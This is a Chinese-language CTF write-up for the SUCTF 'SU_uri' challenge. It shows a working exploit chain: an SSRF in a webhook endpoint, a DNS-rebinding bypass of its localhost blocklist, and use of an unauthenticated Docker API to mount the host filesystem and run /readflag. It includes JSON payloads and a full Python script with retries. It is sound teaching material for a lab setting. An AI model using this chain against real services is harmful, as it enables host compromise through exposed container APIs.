# SUCTF SU_uri WP

## 基本信息

- 目标地址: `http://101.245.108.250:10011/`
- 最终 flag:

```text
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

## 题目分析

访问首页后可以看到一个简单的调试面板，前端会向 `/api/webhook` 发送如下 JSON:

```json
{
  "url": "https://example.com/webhook",
  "body": "{\"event\":\"ping\"}"
}
```

也就是说，服务端会读取我们提供的 `url`，然后把 `body` 作为请求体转发出去。

先做一轮基础探测:

1. `http://example.com` 可以正常转发，说明这里确实存在 SSRF。
2. `http://127.0.0.1/` 返回 `blocked IP: 127.0.0.1`。
3. `http://localhost/` 返回 `blocked host: localhost`。
4. `10.x.x.x`、`172.16.x.x`、`192.168.x.x`、`169.254.169.254`、`::1` 等地址也都会被拦。
5. `file://`、`gopher://`、`ftp://` 等协议会提示 `unsupported scheme`。

这说明题目已经做了基础的 SSRF 过滤。

## 关键突破点

虽然目标会拦截内网和回环地址，但它的处理方式存在典型的 TOCTOU 问题:

1. 先解析一次域名并检查 IP 是否属于黑名单。
2. 之后真正发起 HTTP 请求时，HTTP 客户端会再次解析域名。

如果两次解析结果不同，就可以绕过过滤。这里直接使用 DNS rebinding 即可。

我使用的 rebinding 域名格式为:

```text
http://<tag>-make-9.9.9.9-rebind-127.0.0.1-rr-<tag>.1u.ms:PORT/PATH
```

它的效果是:

1. 第一次解析返回公网 IP `9.9.9.9`，通过黑名单检查。
2. 第二次解析返回 `127.0.0.1`，真正连接本机服务。

## 本地服务探测

通过 rebinding 对本地端口进行探测，可以发现:

1. `127.0.0.1:8080` 是当前这套 Web 服务自身。
2. `127.0.0.1:2375` 存在另一个 HTTP 服务。

继续对 `2375` 测试 Docker 常见接口，发现:

- `POST /containers/create` 会接受 Docker 风格的 JSON。
- 返回格式也是标准 Docker Remote API 响应。

因此可以确认:

```text
127.0.0.1:2375 = 未授权 Docker Remote API
```

到这里利用链已经很清楚了:

```text
SSRF -> DNS Rebinding -> 访问本地 Docker API -> 创建容器 -> 挂载宿主目录 -> 执行 readflag
```

## 利用过程

### 1. 创建带宿主挂载的容器

利用 Docker API 创建一个容器，把宿主根目录挂载到容器中的 `/host`:

```json
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "sleep 10000"],
  "Tty": true,
  "HostConfig": {
    "Binds": ["/:/host:ro"]
  }
}
```

对应调用:

```text
POST /containers/create?name=hostbox
```

创建成功后会拿到容器 ID。

### 2. 启动容器

```text
POST /containers/hostbox/start
```

返回 `204` 说明启动成功。

### 3. 先读宿主上的 flag 文件

在容器中创建 exec，尝试读取宿主常见 flag 路径:

```json
{
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": true,
  "Cmd": [
    "/bin/sh",
    "-c",
    "for f in /host/flag /host/flag.txt /host/root/flag /host/root/flag.txt; do [ -f \"$f\" ] && echo ===$f=== && cat \"$f\"; done"
  ]
}
```

对应调用:

```text
POST /containers/hostbox/exec
POST /exec/<exec_id>/start
```

得到的输出是:

```text
===/host/flag===
Flag is not here. executable /readflag to get it!
```

这说明真正的 flag 不是直接放在文件里，而是需要执行宿主上的 `/readflag`。

### 4. 执行宿主的 `/readflag`

因为宿主根目录已经挂载到 `/host`，所以可以直接执行:

```json
{
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": true,
  "Cmd": ["/bin/sh", "-c", "/host/readflag || chroot /host /readflag"]
}
```

再次调用:

```text
POST /containers/hostbox/exec
POST /exec/<exec_id>/start
```

最终回显:

```text
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```

## 关键点总结

这题的核心不在普通 SSRF，而在两个更关键的点:

1. 服务端对目标 URL 做了两次解析，存在 DNS rebinding 绕过空间。
2. 本地开放了未授权 Docker Remote API，可以直接从 SSRF 升级到宿主命令执行。

完整利用链如下:

```text
前端 webhook 调试功能
-> 后端 SSRF
-> DNS rebinding 绕过 localhost/IP 黑名单
-> 命中 127.0.0.1:2375 Docker API
-> 创建挂载宿主目录的容器
-> 在容器内 exec 执行 /host/readflag
-> 拿到 flag
```

## 复现脚本

下面给一份可以直接复现思路的 Python 脚本。由于 rebinding 命中率不是 100%，脚本里做了重试。

```python
import json
import time
import uuid

import requests


BASE = "http://101.245.108.250:10011/api/webhook"


def rb_url(path: str) -> str:
    tag = uuid.uuid4().hex[:8]
    return f"http://{tag}-make-9.9.9.9-rebind-127.0.0.1-rr-{tag}.1u.ms:2375{path}"


def webhook(path: str, body: str = "", retry: int = 40):
    for _ in range(retry):
        resp = requests.post(
            BASE,
            json={"url": rb_url(path), "body": body},
            timeout=25,
        )
        data = resp.json()
        raw = json.dumps(data, ensure_ascii=False)

        if "target_status" in data:
            return data

        if any(x in raw for x in [
            "blocked IP",
            "resolve failed",
            "no such host",
            "i/o timeout",
            "Client.Timeout",
        ]):
            time.sleep(0.3)
            continue

        return data

    raise RuntimeError(f"request failed after retry: {path}")


create_body = json.dumps({
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "sleep 10000"],
    "Tty": True,
    "HostConfig": {
        "Binds": ["/:/host:ro"]
    }
})

print("[*] create hostbox")
print(webhook("/containers/create?name=hostbox", create_body))

print("[*] start hostbox")
print(webhook("/containers/hostbox/start", ""))

exec_body = json.dumps({
    "AttachStdout": True,
    "AttachStderr": True,
    "Tty": True,
    "Cmd": ["/bin/sh", "-c", "/host/readflag || chroot /host /readflag"],
})

print("[*] create exec")
exec_resp = webhook("/containers/hostbox/exec", exec_body)
print(exec_resp)
exec_id = json.loads(exec_resp["target_body"])["Id"]

print("[*] start exec")
result = webhook(
    f"/exec/{exec_id}/start",
    json.dumps({"Detach": False, "Tty": True}),
)
print(result["target_body"])
```

## 最终结论

最终 flag 为:

```text
SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
```
